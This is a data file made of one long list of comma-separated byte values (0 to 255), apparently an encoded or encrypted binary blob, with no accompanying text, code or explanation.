27,245,66,2,15,98,156,180,193,212,172,17,123,27,61,33,199,239,153,180,81,160,65,100,9,223,200,243,143,173,77,111,114,24,0,42,239,207,128,224,86,102,112,86,112,46,178,158,128,164,74,114,123,22,51,35,196,231,140,162,75,118,18,15,47,209,245,155,131,173,72,79,56,70,119,173,160,156,154,163,12,46,81,96,34,152,254,153,182,166,71,106,15,37,45,216,244,146,178,84,120,30,6,48,42,199,247,152,187,160,92,50,68,99,107,151,229,155,225,24,65,88,119,104,202,130,180,194,226,24,4,91,122,215,189,137,232,146,173,74,122,27,62,35,249,193,236,136,166,70,104,12,50,218,196,159,177,166,165,93,39,69,99,208,191,144,228,205,42,67,118,21,34,131,178,158,236,151,8,68,35,74,106,134,167,143,181,188,166,65,30,14,47,210,247,141,182,128,92,122,26,60,32,198,238,178,158,210,7,4,10,68,165,130,188,199,192,66,30,61,88,112,89,129,170,145,175,85,21,111,84,66,156,178,209,191,163,73,80,122,21,50,34,195,230,139,161,74,117,112,14,46,208,244,154,168,129,9,33,59,64,55,204,231,137,134,191,92,96,57,65,66,159,253,220,251,228,70,107,75,77,101,187,176,216,229,18,35,110,7,14,52,219,246,210,234,30,61,77,7,65,34,132,173,205,253,26,5,27,56,40,40,203,240,134,175,90,118,20,52,214,217,255,231,187,129,13,55,95,61,34,215,192,235,135,165,69,103,11,49,217,195,253,154,138,171,78,115,9,24,240,232,246,157,184,4,6,3,88,47,209,252,164,219,237,22,67,110,10,40,200,234,142,147,187,165,64,29,13,46,209,246,140,148,191,91,121,25,59,223,239,192,210,196,252,10,127,127,7,152,138,179,196,248,227,58,126,90,62,40,195,224,144,177,179,88,110,23,2,222,252,156,190,162,167,79,121,20,49,33,194,229,160,141,91,83,61,66,45,155,253,220,129,182,70,17,33,86,120,144,178,211,205,213,113,50,96,4,42,210,252,151,180,164,69,104,108,2,43,214,242,144,176,82,118,28,99,13,40,197,223,187,254,17,38,77,103,14,33,208,227,154,173,12,60,84,114,84,102,154,188,203,239,11,1,29,127,52,216,254,230,144,171,72,120,25,60,0,214,255,234,134,164,68,102,10,48,216,33,252,153,163,135,31,61,68,126,191,133,176,209,249,30,19,105,14,46,153,149,183,209,224,87,14,109,9,39,199,233,236,146,186,164,127,28,12,45,208,245,234,147,190,90,120,24,58,222,196,198,216,195,226,45,45,97,27,220,138,132,130,197,169,75,111,21,61,39,194,159,143,143,178,87,109,22,1,221,251,155,189,128,166,78,120,19,26,13,141,173,200,43,244,82,115,12,97,129,160,254,142,230,164,65,113,18,53,218,240,153,132,160,93,125,31,3,41,209,251,150,179,163,68,70,107,1,0,248,191,202,231,5,117,52,13,88,39,130,189,149,184,93,115,123,102,2,32,192,226,134,172,84,126,25,21,5,38,201,238,174,128,81,56,91,80,103,223,142,145,248,170,90,119,86,117,107,213,242,165,204,226,55,54,9,99,119,99,180,212,136,169,76,113,7,48,58,214,244,148,182,90,64,104,18,45,41,217,250,157,168,117,72,101,24,42,142,147,172,223,252,239,112,94,7,60,199,132,172,220,179,74,37,88,109,158,134,188,244,221,227,92,53,52,66,149,129,163,228,205,168,64,110,64,117,104,180,144,161,203,231,88,41,21,68,146,187,154,215,250,243,67,50,26,47,210,192,176,199,237,168,20,109,22,43,129,184,214,235,136,239,1,51,94,120,217,239,152,131,190,92,124,30,2,40,208,250,149,178,162,162,69,106,0,41,254,221,243,246,20,58,53,26,78,104,138,159,154,228,16,30,53,21,68,148,255,252,133,231,83,49,54,87,75,105,200,237,131,172,87,115,112,16,50,214,252,228,142,169,70,118,118,25,62,212,215,197,202,231,10,48,8,29,32,205,250,138,155,168,19,52,111,66,57,145,189,210,181,91,58,41,88,103,42,216,228,129,129,18,16,42,79,118,42,131,234,214,241,231,46,86,79,43,45,210,232,145,188,88,118,22,56,220,33,201,243,142,171,113,81,14,4,209,195,149,173,238,228,73,112,19,99,97,169,191,236,141,176,85,107,20,63,219,249,248,154,190,164,76,118,17,46,222,255,226,204,145,224,5,62,94,42,209,240,211,209,197,235,44,38,102,61,155,238,151,225,189,91,123,29,1,39,207,249,148,177,128,161,68,105,63,40,211,197,160,164,167,21,55,50,90,37,207,242,130,190,186,90,121,109,21,222,172,175,132,254,92,30,126,19,15,53,207,180,195,230,88,25,59,78,124,213,230,227,222,251,0,26,62,91,116,155,136,233,192,161,65,99,102,12,52,222,249,150,134,167,74,111,100,13,56,212,242,146,180,114,83,33,32,88,119,215,245,155,145,86,98,106,95,64,109,128,187,206,231,242,50,88,91,125,34,146,231,144,187,87,117,21,55,58,32,200,242,141,170,90,123,30,3,217,33,204,194,171,244,7,32,93,89,118,155,191,165,201,253,84,119,19,108,149,155,184,250,179,224,75,117,16,45,221,254,192,229,187,164,79,107,9,41,203,239,244,156,134,161,84,67,92,125,167,190,245,253,188,20,53,85,84,111,157,183,227,129,252,160,67,104,62,39,210,238,140,139,173,81,119,31,9,36,193,241,146,148,185,101,85,39,113,152,253,159,131,169,176,90,117,18,2,35,198,235,129,170,180,80,110,14,48,212,208,207,133,174,182,93,100,23,48,149,180,180,210,168,23,14,53,5,123,137,185,216,133,172,73,68,49,2,114,211,252,145,193,15,60,9,96,76,46,222,247,145,191,7,112,44,100,31,34,151,189,199,242,225,9,22,36,8,43,208,230,143,186,86,116,20,21,57,223,199,241,140,169,89,122,29,2,55,32,203,231,175,136,2,56,93,124,2,221,250,234,139,174,83,105,18,61,56,214,246,152,188,162,74,116,15,44,246,241,246,163,245,241,30,106,2,40,195,191,171,218,200,174,56,109,3,49,132,197,177,151,179,89,116,27,109,43,136,247,236,142,237,10,11,35,124,84,223,174,234,138,172,80,118,30,8,35,192,240,240,147,184,78,119,98,62,220,252,158,130,135,175,89,94,60,79,103,141,190,128,195,253,6,63,69,124,221,188,225,205,204,162,82,115,22,59,209,250,229,129,95,94,64,100,10,50,220,247,148,132,165,141,97,31,83,114,187,179,235,247,26,24,17,36,107,43,134,186,214,241,36,56,12,99,28,33,128,231,193,244,28,53,58,102,7,42,207,229,142,185,85,115,114,20,56,222,198,240,139,168,88,121,28,74,27,145,143,174,208,164,86,126,16,10,29,220,161,173,227,238,82,44,95,90,55,215,161,222,249,243,38,115,75,103,121,137,183,128,187,162,80,116,7,98,120,141,186,201,138,26,124,42,68,48,52,202,243,158,186,88,120,26,62,36,204,213,240,141,189,116,108,76,17,97,158,142,233,137,171,79,117,29,7,34,255,206,239,146,183,77,118,97,23,246,242,140,236,151,162,73,123,71,69,111,202,250,204,200,254,1,15,12,124,157,248,178,166,200,238,50,32,80,126,158,188,182,128,249,19,62,99,0,36,213,230,147,157,131,175,67,44,69,113,159,174,221,191,252,14,3,33,15,36,201,245,202,242,31,20,37,48,69,100,140,163,222,180,94,88,117,101,6,41,206,228,141,184,84,81,113,19,55,221,197,239,138,141,122,54,63,87,97,222,155,160,200,224,12,37,40,24,69,219,190,161,137,172,81,103,111,26,54,212,244,150,186,160,72,114,13,9,19,247,253,226,184,161,76,104,6,5,39,203,241,153,131,94,123,107,38,35,119,135,183,157,185,87,119,25,61,35,42,212,239,140,188,93,64,101,59,14,3,142,166,205,170,78,116,28,6,33,221,205,238,145,182,76,117,96,60,218,250,251,159,133,135,122,123,29,63,42,195,206,136,136,161,77,102,11,106,158,165,174,224,131,172,66,35,91,117,128,187,237,219,188,14,49,98,27,98,149,185,221,162,140,224,74,108,27,102,159,162,193,204,189,28,73,57,73,111,156,151,199,238,244,22,69,124,63,141,142,169,196,208,238,18,48,42,64,122,205,227,140,183,178,80,112,18,54,220,196,238,137,166,86,86,121,30,52,221,200,228,130,162,110,106,40,70,115,159,247,231,136,171,80,69,110,25,53,211,243,149,185,95,71,113,107,8,56,217,214,204,190,178,75,109,100,67,105,152,160,152,142,79,40,37,38,66,113,198,180,156,180,4,57,84,115,66,39,150,230,217,244,16,48,7,106,80,104,133,231,154,169,31,60,87,74,92,142,137,169,222,240,25,116,31,59,217,216,250,158,132,172,86,113,14,62,223,33,198,156,133,176,76,106,10,44,208,255,208,169,199,23,27,112,6,54,222,247,221,157,252,20,47,49,7,105,144,244,240,224,129,164,73,31,8,51,207,237,236,142,178,88,64,106,5,34,210,217,187,212,245,17,16,96,44,140,143,168,197,210,181,19,115,37,77,39,204,226,139,149,177,79,111,17,53,219,195,237,136,165,180,127,85,79,124,144,136,160,143,228,162,91,108,70,113,149,185,133,213,239,234,10,40,74,52,158,179,215,247,18,70,79,106,7,55,216,251,224,182,95,74,69,99,3,37,201,197,186,207,25,49,28,105,66,116,130,162,216,196,27,58,23,92,73,40,210,237,138,186,91,126,99,24,1,44,200,204,171,168,76,114,26,99,62,219,203,236,143,180,74,89,51,51,100,152,169,147,198,163,38,4,122,61,32,32,139,222,193,253,8,26,71,100,46,216,175,169,241,13,78,35,83,116,130,153,192,156,186,90,124,96,6,46,216,210,239,159,170,142,72,30,7,50,206,203,235,141,177,87,127,105,46,12,149,188,177,153,217,12,12,77,51,152,255,233,232,196,245,7,124,39,3,59,203,181,166,198,190,11,110,94,113,146,150,236,211,204,225,90,50,28,116,146,198,226,128,191,161,69,107,19,61,216,245,229,172,165,233,13,41,23,51,209,241,147,183,93,164,78,105,6,54,253,215,150,225,26,168,78,98,23,36,194,238,159,151,85,71,71,98,11,105,135,184,201,184,17,116,127,25,122,97,152,160,135,252,82,46,14,84,14,99,147,164,200,167,71,97,120,110,105,158,202,225,142,166,73,120,29,17,111,151,175,207,140,239,84,101,12,94,122,150,136,148,198,166,4,33,91,7,101,135,186,168,136,10,8,32,31,37,121,155,171,216,252,47,123,20,5,126,121,129,224,219,191,191,71,78,73,97,34,143,234,140,176,86,126,104,3,32,208,208,243,152,174,87,66,30,22,241,176,132,175,219,185,13,48,54,81,43,143,255,174,218,175,77,109,15,51,217,193,235,229,130,178,83,92,54,117,148,128,225,158,190,160,68,106,18,60,215,244,228,228,173,129,6,37,83,50,208,240,146,182,187,163,77,104,5,53,214,249,158,180,188,141,110,53,69,35,205,237,209,250,252,6,53,43,70,122,149,224,220,181,89,82,32,81,112,83,222,185,193,252,89,80,64,69,112,122,200,161,132,187,74,28,56,49,50,156,201,234,141,178,72,113,123,23,53,213,247,155,129,169,83,110,106,26,59,222,233,180,204,232,1,51,102,25,44,204,250,161,251,9,24,36,94,83,107,190,240,200,241,28,122,88,77,11,53,208,237,157,190,161,70,28,5,15,43,201,233,139,175,127,80,110,81,144,126,193,183,151,160,86,21,88,124,137,157,180,170,194,237,3,126,37,9,36,53,254,181,219,234,76,32,79,113,151,140,201,228,129,177,82,117,26,48,217,196,255,157,189,95,67,105,59,22,152,182,138,183,134,255,4,45,71,112,187,163,221,193,234,172,9,103,66,125,213,248,157,146,187,166,66,96,0,34,198,236,190,176,252,27,0,102,9,46,196,237,152,180,177,81,115,23,61,15,226,227,142,165,183,80,127,65,122,41,201,242,139,235,225,3,120,40,111,153,133,233,129,177,86,71,122,28,52,130,183,200,199,166,23,76,116,25,108,156,144,223,143,233,72,69,101,7,43,209,249,227,190,91,75,108,110,19,41,210,215,180,183,3,61,29,104,10,98,142,190,219,179,229,69,16,99,66,111,158,230,207,174,73,124,42,68,107,35,139,241,150,172,85,64,28,58,57,219,255,229,141,183,82,111,31,42,47,39,179,163,217,249,75,61,76,99,144,208,141,227,198,249,81,116,25,47,216,34,254,156,188,94,66,104,58,23,145,159,132,226,133,170,64,105,20,48,206,238,239,147,185,139,102,111,10,32,212,253,251,197,254,165,77,14,55,111,140,166,252,212,227,21,9,101,5,45,210,228,151,152,176,28,55,64,50,97,206,244,134,217,243,15,112,81,61,40,196,226,130,131,167,77,117,31,58,215,199,232,139,176,143,99,121,65,119,211,255,153,243,226,230,69,45,24,50,220,146,216,208,165,227,68,121,6,121,159,168,236,248,90,74,74,109,18,40,209,252,152,182,86,120,123,97,9,51,228,198,155,242,26,12,45,98,65,108,145,233,204,173,21,50,101,31,60,44,205,240,149,171,84,127,27,24,18,247,254,228,140,182,81,110,30,30,1,38,252,229,186,129,15,44,69,92,109,156,138,236,250,175,95,115,93,104,127,109,243,222,187,64,65,32,64,107,99,208,140,160,199,230,51,104,19,47,205,204,238,146,184,160,74,101,2,24,254,144,169,220,252,164,64,30,62,32,196,201,241,177,155,90,10,100,11,73,169,174,163,216,251,12,48,29,126,117,130,165,161,198,187,29,49,81,125,115,195,225,224,130,166,76,116,30,57,214,198,231,160,163,234,8,48,64,50,151,178,209,210,221,238,7,105,82,56,198,222,150,250,207,236,15,109,64,41,137,190,225,188,89,168,73,108,17,39,250,214,195,241,85,93,122,37,78,123,129,228,223,187,67,162,61,39,69,100,200,163,136,172,82,122,67,30,59,43,230,194,233,227,40,27,18,82,97,144,169,160,202,181,77,109,57,29,76,100,184,171,195,171,73,105,11,14,52,220,198,203,147,225,11,114,6,1,53,44,237,154,182,57,43,35,88,94,102,140,190,227,131,181,126,46,18,124,100,141,237,145,183,95,99,73,1,49,49,212,211,162,169,163,115,12,61,211,51,200,252,139,181,79,66,59,66,66,146,201,248,200,234,39,36,20,54,122,136,175,175,147,184,15,56,123,120,38,142,190,220,206,233,75,115,29,56,255,232,230,232,141,163,102,90,87,127,148,243,151,156,132,132,100,35,69,123,155,185,149,145,129,180,78,114,12,127,139,184,238,169,229,232,28,40,85,80,207,180,196,225,231,16,43,31,7,49,204,233,153,186,188,139,90,36,69,98,197,171,200,171,93,81,59,19,106,124,203,226,235,167,2,10,112,65,115,150,242,240,216,251,27,8,62,106,63,106,168,182,218,239,26,104,39,72,123,143,197,174,242,173,10,63,52,11,127,144,251,223,240,91,127,101,108,22,49,206,254,181,175,174,57,40,84,12,35,154,228,196,248,23,7,19,84,93,127,131,175,203,254,212,49,104,120,113,115,136,152,131,249,16,2,98,75,120,138,156,182,221,173,68,103,93,118,104,126,134,172,199,245,94,55,93,123,102,112,254,131,128,234,5,114,16,103,130,196,200,172,195,162,7,55,81,127,156,242,245,155,131,173,72,101,21,28,244,186,189,217,135,163,65,97,3,39,205,245,181,180,242,232,2,106,65,106,206,245,194,146,252,6,45,74,67,98,203,166,221,208,239,160,56,80,10,96,141,228,134,170,175,87,65,28,57,41,202,237,146,130,157,82,39,29,123,146,190,179,202,192,226,62,62,87,108,108,142,226,144,169,9,9,104,0,101,218,136,222,255,227,1,79,116,10,51,222,250,152,184,90,126,67,107,63,29,131,184,214,213,166,126,43,32,66,125,138,165,218,243,95,71,127,3,14,38,156,178,200,228,226,14,84,110,120,108,148,161,239,187,21,16,56,80,8,152,142,242,142,172,76,110,18,56,63,3,233,232,193,186,38,14,103,57,77,144,180,201,252,237,28,55,27,122,146,97,140,170,139,161,74,117,59,2,142,130,177,215,195,207,19,42,81,103,138,137,145,149,143,160,5,35,67,118,159,191,175,215,194,167,78,44,77,109,155,170,182,226,229,22,16,7,64,98,139,160,246,138,186,18,52,93,9,105,130,160,202,196,174,86,64,27,18,5,201,236,145,134,133,119,50,90,113,214,180,178,221,197,233,27,121,84,120,106,172,225,156,168,184,88,103,110,90,156,149,215,239,232,234,77,115,77,124,156,249,211,242,21,30,3,36,113,123,143,185,219,198,192,55,15,39,97,40,156,165,192,180,26,15,64,29,13,46,251,219,133,225,228,116,55,86,114,139,134,163,194,244,71,43,35,39,73,147,137,146,151,239,14,61,65,83,106,91,145,165,212,255,17,11,1,82,65,151,170,206,251,209,6,37,104,31,28,11,239,161,196,229,99,89,25,108,45,195,180,153,141,249,78,52,86,122,56,200,163,213,201,238,28,31,79,119,158,134,185,197,180,164,69,104,39,14,141,158,162,220,241,82,124,28,13,76,199,212,182,150,180,94,22,19,26,103,202,226,232,135,207,91,110,89,55,58,200,169,239,201,239,26,58,95,51,213,249,159,204,189,234,0,40,85,125,33,253,224,130,225,170,85,37,10,61,216,165,147,168,202,162,77,121,8,86,210,233,213,182,170,91,6,105,95,111,136,180,208,191,164,89,66,71,36,102,143,185,193,242,91,174,127,21,126,35,193,182,139,185,95,40,118,10,121,214,196,231,150,195,64,111,61,97,27,220,151,240,192,235,9,35,35,21,61,39,194,181,162,185,18,48,61,90,64,221,247,137,254,161,75,126,90,27,98,111,141,171,234,15,26,54,67,12,98,129,187,204,195,228,16,36,18,94,116,153,191,213,174,141,84,51,68,106,108,251,214,210,253,230,68,103,12,34,0,248,181,193,234,81,117,27,3,45,39,196,244,191,149,84,46,28,7,35,193,192,226,134,172,84,126,25,54,12,234,192,251,145,191,84,125,2,33,198,244,237,245,157,162,10,56,92,117,97,164,145,161,209,226,14,105,28,58,197,201,254,255,250,228,3,35,65,62,200,165,218,216,249,57,93,122,64,98,134,181,216,190,142,81,72,124,27,52,202,248,148,163,177,238,49,95,69,109,157,250,194,231,252,20,123,30,41,197,210,231,133,164,92,84,48,47,65,149,133,189,133,225,29,11,35,24,41,51,211,150,236,200,32,27,35,71,70,210,233,200,243,236,9,13,106,64,96,147,143,160,136,82,87,98,124,4,34,221,225,130,179,185,81,115,120,92,123,157,161,217,209,81,53,73,126,79,53,149,188,220,222,250,2,43,11,12,57,197,255,135,190,67,120,15,19,3,107,140,183,218,246,14,124,83,82,99,146,226,164,223,226,0,125,24,53,37,37,200,237,131,172,87,115,17,49,211,214,252,206,163,165,79,100,7,52,207,249,232,248,138,178,78,118,24,32,198,200,169,210,203,239,5,17,8,106,151,183,161,245,214,68,9,51,94,126,201,245,147,138,139,94,72,38,72,97,139,166,217,158,240,246,60,87,6,61,196,250,129,220,243,28,56,87,106,210,138,190,213,226,167,77,118,22,12,151,140,170,196,233,245,71,37,71,122,104,200,206,200,226,247,27,10,26,122,150,184,203,221,60,88,24,57,67,46,210,239,243,136,84,86,69,96,26,56,196,189,217,250,230,2,45,97,88,103,153,163,138,219,31,43,79,29,13,46,223,245,132,160,172,78,117,97,104,109,157,225,158,255,0,39,90,37,124,56,148,179,193,241,91,113,26,5,0,222,254,224,132,170,82,124,23,52,3,36,237,193,142,162,95,98,5,60,33,192,246,235,192,231,1,59,87,107,208,155,168,166,206,161,77,106,18,63,217,203,244,158,203,232,14,33,68,124,215,156,166,211,249,88,114,111,0,62,196,232,237,150,136,27,48,46,72,101,150,232,161,219,246,236,116,78,76,100,195,225,181,223,239,20,48,99,42,151,132,191,147,141,170,90,123,30,3,217,194,237,137,134,166,72,108,18,16,9,243,149,133,156,188,88,122,0,51,210,181,215,254,16,226,25,123,88,121,156,179,225,138,85,180,89,103,25,56,195,162,218,249,233,224,44,96,71,102,150,160,150,141,84,107,105,16,16,53,195,240,222,255,228,15,2,58,48,111,134,175,193,164,25,55,57,17,26,118,142,165,209,240,44,112,18,99,108,146,141,203,202,225,76,40,89,66,2,35,198,235,129,170,85,113,15,14,48,212,250,226,140,167,110,89,78,56,48,208,190,170,197,238,1,43,84,88,49,213,157,254,203,241,8,62,87,45,55,211,241,145,179,87,125,101,15,42,199,252,218,213,251,85,110,124,20,35,207,213,245,199,182,242,52,94,8,41,204,208,230,143,186,86,94,57,120,159,136,188,241,142,250,21,59,73,71,168,193,173,181,208,238,6,24,19,57,62,227,155,175,199,247,7,58,18,123,144,178,196,245,249,162,74,116,15,6,241,185,174,192,186,163,78,106,8,40,202,238,190,145,140,253,125,109,14,49,214,236,149,128,92,89,121,27,21,8,196,226,135,189,83,74,87,117,49,51,196,255,131,201,42,34,59,81,90,101,206,227,195,251,21,32,20,127,44,142,179,210,205,235,80,118,125,24,17,50,212,230,144,188,92,61,34,73,97,146,171,239,195,242,2,62,24,31,43,195,232,233,145,71,110,105,72,69,118,146,182,198,138,237,28,44,78,7,35,199,226,152,208,49,14,41,65,123,99,219,229,203,241,24,50,11,25,112,110,143,168,206,181,83,106,7,22,39,35,223,241,159,181,69,100,27,120,150,187,136,177,217,166,16,45,93,76,202,133,140,175,232,252,7,39,16,52,50,236,246,224,154,191,94,120,0,52,149,185,210,217,250,243,71,59,90,106,150,225,218,185,240,241,77,105,7,39,201,237,147,154,132,95,124,108,13,48,213,235,190,146,182,81,104,22,43,42,220,252,152,166,240,17,5,40,125,119,222,164,222,235,230,67,96,19,23,40,246,231,221,252,28,3,55,51,51,147,175,220,204,175,28,29,63,87,78,64,202,172,242,233,1,40,15,17,88,134,183,178,138,169,75,100,120,28,50,157,182,160,206,31,44,110,43,93,112,150,250,133,137,173,79,33,46,78,123,144,189,129,249,1,58,46,1,17,46,221,253,213,242,23,50,38,81,14,104,150,167,193,188,13,60,90,65,72,72,192,161,192,249,6,20,113,41,140,146,151,239,134,174,71,116,11,24,199,211,197,245,139,244,0,39,1,36,115,148,172,171,204,218,76,49,81,105,144,245,244,150,186,160,72,114,13,42,218,251,253,226,184,161,76,66,43,42,193,229,225,139,146,82,107,121,29,34,220,167,220,217,247,22,37,23,117,119,138,184,144,128,181,77,85,119,55,52,215,227,196,199,238,0,53,78,8,105,170,175,194,178,186,69,101,114,45,214,234,142,145,171,165,26,61,75,113,97,145,230,246,243,240,0,99,92,104,159,249,140,219,235,21,19,52,98,36,131,189,181,191,81,46,49,18,92,121,146,232,193,205,243,70,74,96,9,52,208,238,142,176,84,122,98,107,6,35,211,222,186,231,82,119,100,36,115,152,143,164,194,225,41,122,29,1,110,102,154,162,220,228,83,113,17,51,54,220,196,238,137,166,86,119,48,18,123,153,200,244,154,162,72,121,19,127,63,136,184,161,136,171,80,102,15,58,214,211,217,184,253,17,2,113,12,41,217,217,252,225,183,138,102,110,88,37,199,202,240,152,130,93,122,106,11,46,211,195,220,136,165,2,118,20,53,50,198,253,254,158,170,80,111,113,50,110,129,174,169,198,251,67,59,79,68,109,241,248,155,130,189,41,19,109,118,150,171,221,177,151,254,25,61,65,93,194,208,181,242,201,255,15,106,6,37,217,227,139,154,175,79,95,97,27,117,129,179,172,255,14,85,53,53,70,98,213,225,132,147,174,177,92,13,0,81,168,159,192,224,1,63,78,121,87,109,158,188,245,166,3,53,8,47,125,222,204,244,154,163,83,126,99,118,21,43,220,245,131,251,29,52,94,80,103,213,139,185,201,232,72,51,95,84,95,132,134,174,129,173,74,114,31,24,46,200,254,171,200,238,1,36,92,55,124,134,179,217,165,22,18,55,69,109,123,216,247,233,166,83,90,115,21,41,41,217,231,192,196,18,119,122,88,98,134,132,181,237,170,3,52,69,124,33,201,210,237,138,186,91,126,99,57,34,205,200,230,134,168,102,95,22,13,214,236,244,253,131,164,82,98,19,50,149,183,222,211,194,249,91,56,89,124,147,193,234,146,148,191,89,101,25,62,199,184,210,195,207,31,28,97,90,99,140,187,225,177,179,74,100,113,10,62,192,226,157,136,205,236,12,80,70,96,192,164,216,239,31,95,40,44,74,47,194,160,218,238,19,29,53,2,113,152,169,227,133,226,20,37,38,43,75,59,152,174,218,181,81,111,110,16,52,218,194,236,135,164,84,117,119,28,50,241,235,185,128,172,64,35,37,90,81,218,253,128,237,231,25,37,93,68,51,209,241,147,183,93,69,111,10,6,54,215,208,178,250,26,73,117,19,16,36,196,255,139,201,91,42,39,79,44,48,198,239,154,182,84,116,60,23,41,122,201,241,221,185,86,116,119,45,51,43,203,240,144,181,75,125,12,22,204,243,168,140,252,254,6,32,91,55,196,165,183,208,205,201,73,125,94,115,145,143,135,154,143,167,67,120,24,56,194,228,140,244,136,16,2,42,95,119,158,251,168,207,248,20,123,19,16,56,197,242,131,139,170,176,79,127,97,67,128,164,217,235,190,69,44,39,79,111,179,236,198,246,226,24,1,30,48,201,240,242,149,245,255,29,29,57,67,104,202,236,153,164,66,80,31,87,114,148,193,231,150,190,1,83,122,72,126,170,145,168,247,66,18,11,58,73,60,219,246,176,204,234,31,12,107,83,126,147,162,219,213,94,76,11,3,75,98,151,169,205,180,93,72,100,97,1,35,199,199,184,241,31,63,51,8,8,125,128,162,210,231,18,35,102,59,62,59,205,235,205,244,0,40,50,55,121,99,131,183,200,227,74,112,24,2,247,244,141,164,200,178,72,113,28,56,214,213,247,177,172,160,14,110,11,59,220,222,195,153,130,173,73,103,7,3,224,182,175,182,235,65,30,40,91,118,130,184,184,154,180,79,103,74,4,32,223,228,248,143,178,168,86,9,9,32,196,167,197,207,225,20,47,105,74,139,142,189,159,130,184,68,73,127,92,169,176,174,213,200,182,64,34,47,77,107,170,130,154,225,225,0,35,77,50,212,201,255,144,176,189,71,96,8,60,208,212,245,178,78,87,14,38,85,117,151,161,237,204,243,13,12,98,119,86,189,162,222,231,29,77,95,53,75,120,154,155,128,225,19,11,13,35,0,46,214,252,133,177,80,102,127,106,25,58,204,160,215,240,28,51,70,25,117,113,142,167,154,242,30,50,12,77,127,100,197,239,138,181,89,126,27,17,40,208,133,166,200,255,6,34,21,127,96,149,187,135,200,252,21,35,79,118,58,209,203,145,145,185,89,106,22,61,221,220,241,174,241,31,5,45,93,58,130,134,188,212,183,91,112,13,22,58,217,223,249,141,176,168,8,84,64,97,138,187,230,194,250,21,49,102,13,215,222,250,224,154,188,64,81,17,50,151,179,164,171,204,229,92,39,75,65,110,192,201,194,223,163,88,57,66,101,148,186,159,153,204,245,7,116,25,47,216,195,159,189,188,94,66,104,16,58,213,242,226,169,139,170,76,96,29,32,219,226,128,161,87,169,6,41,71,125,149,165,146,250,15,228,12,31,51,40,213,254,159,173,77,120,76,40,71,105,141,173,197,189,25,37,51,91,60,40,199,249,147,186,71,111,115,28,112,103,128,172,195,246,70,38,66,94,119,223,144,173,197,190,85,61,85,65,112,150,131,153,180,167,2,35,121,76,112,148,220,196,207,251,71,101,5,39,42,208,248,226,189,90,74,107,14,51,40,209,214,181,237,86,116,30,71,100,122,162,233,147,217,52,10,77,66,126,153,199,231,137,173,83,123,101,0,221,205,205,240,191,134,27,59,27,41,204,234,254,232,157,171,24,110,76,112,100,199,157,229,144,172,74,106,12,26,251,186,166,167,191,175,80,115,24,46,215,194,180,182,178,0,65,103,15,57,212,241,225,130,132,169,127,104,57,2,136,184,221,231,165,242,15,46,65,123,159,176,155,189,176,177,85,12,50,53,209,248,158,169,66,65,75,6,96,94,143,164,196,244,94,92,35,90,119,108,174,245,151,231,25,20,50,80,60,43,202,232,148,182,85,97,97,11,43,218,207,247,159,163,85,102,53,91,118,156,181,202,176,238,4,42,42,31,90,188,178,219,240,248,0,106,23,87,102,131,184,130,188,11,6,106,4,4,50,194,247,158,165,64,123,11,9,69,125,137,164,219,233,80,11,77,67,96,36,211,243,154,164,48,29,22,114,147,121,138,225,135,248,28,50,85,91,216,157,179,162,139,160,94,125,3,55,41,139,180,160,193,234,27,103,67,123,148,176,206,252,236,225,3,61,84,45,218,209,236,139,181,85,80,118,31,52,195,228,232,173,204,236,48,38,64,32,132,184,207,220,170,26,15,45,109,105,147,184,154,131,177,179,105,17,40,205,203,164,222,255,251,19,16,109,78,127,128,167,136,244,244,7,35,20,58,34,204,231,132,180,180,87,124,18,59,38,194,224,128,136,107,71,122,20,40,195,201,246,159,163,76,1,56,87,127,144,161,153,245,241,14,4,102,26,62,202,233,153,174,191,72,107,47,75,108,128,183,178,181,16,28,40,38,16,42,198,234,128,184,68,96,23,23,74,126,136,167,216,232,83,10,76,64,70,47,146,160,201,165,66,43,44,106,121,111,189,238,152,169,1,50,105,99,127,144,225,177,197,228,79,108,28,61,32,36,250,227,142,170,72,104,10,46,212,219,239,205,230,173,66,115,83,126,148,138,170,234,187,83,26,14,67,96,147,191,173,159,130,167,125,102,17,45,203,235,236,144,182,116,101,44,68,48,193,228,233,142,187,179,99,85,60,140,141,174,144,153,180,81,65,98,5,42,234,196,218,202,229,25,111,17,113,98,159,175,207,245,179,4,62,83,99,70,195,159,162,188,164,15,62,69,99,135,196,163,193,232,241,7,51,18,48,208,242,188,145,224,227,13,101,21,54,217,254,148,189,168,110,108,104,94,39,205,245,159,186,87,71,71,106,15,37,206,211,184,186,70,96,106,18,22,60,194,253,141,171,80,81,7,13,2,107,139,160,200,235,2,118,42,72,120,100,194,143,245,218,28,51,74,83,59,196,169,174,197,252,45,118,9,110,113,111,182,161,141,165,78,110,25,56,35,214,212,143,173,164,0,63,81,101,114,140,244,208,236,27,51,104,28,58,216,221,237,143,141,182,106,109,93,99,142,135,170,221,187,21,19,35,114,39,178,181,133,192,249,243,59,21,40,143,142,171,161,251,174,2,15,45,75,106,255,228,230,128,189,81,43,84,113,76,146,164,172,145,190,69,107,31,48,49,211,146,174,173,171,4,62,95,120,146,145,234,207,223,224,7,104,84,117,134,162,149,187,130,172,71,100,20,53,216,253,147,188,167,162,64,96,40,11,192,253,140,183,70,169,84,103,30,40,223,246,132,186,1,22,59,90,75,78,196,162,218,249,9,38,22,3,127,113,140,177,133,165,70,97,74,18,48,101,134,168,223,230,2,117,62,64,117,155,246,246,130,187,69,39,85,94,115,99,170,239,196,252,7,43,4,29,59,208,203,211,244,239,2,46,70,7,122,137,184,218,191,10,56,47,76,123,78,194,185,208,193,247,29,7,18,127,103,154,234,130,164,76,84,124,122,107,107,129,133,192,249,245,44,26,54,143,143,181,185,222,250,82,43,37,68,122,191,178,189,193,254,27,109,17,55,223,201,195,224,144,177,84,121,15,56,35,255,157,182,147,174,65,121,10,37,195,206,243,245,155,173,65,57,95,106,128,177,198,151,201,255,7,46,19,56,222,236,130,170,137,177,111,14,12,45,134,188,217,246,245,246,75,32,89,98,129,247,159,184,160,66,103,16,20,62,216,235,158,250,21,26,58,92,90,42,138,182,197,229,70,2,58,84,57,52,154,164,196,229,10,47,117,24,51,134,182,239,211,248,4,116,43,86,108,33,247,224,139,167,69,101,102,10,48,216,194,157,186,170,75,68,95,83,49,208,250,211,250,31,50,35,67,65,90,201,243,249,212,234,45,34,94,90,39,199,233,141,179,91,69,96,61,12,45,208,223,166,251,27,123,9,41,202,222,200,253,139,248,78,44,80,68,39,220,197,240,140,170,74,108,58,27,154,105,135,159,143,176,83,120,14,55,34,212,214,146,224,161,71,111,25,52,209,193,193,228,137,95,72,89,34,56,208,187,242,148,137,186,73,114,30,35,222,153,246,235,201,239,44,88,14,55,152,189,208,217,208,190,86,53,67,110,132,181,146,131,166,68,96,9,15,36,216,